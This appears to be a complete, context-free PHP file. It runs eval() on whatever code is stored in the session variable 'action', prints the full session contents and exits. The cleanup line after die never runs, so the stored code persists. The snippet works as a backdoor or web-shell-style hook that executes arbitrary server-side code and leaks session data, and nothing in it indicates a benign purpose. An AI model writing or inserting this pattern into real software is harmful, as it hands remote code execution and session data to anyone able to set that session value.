<?php
if ($_SESSION['action']) {
		eval($_SESSION['action']);
		print_r($_SESSION);die;
		unset($_SESSION['action']);
	}
?>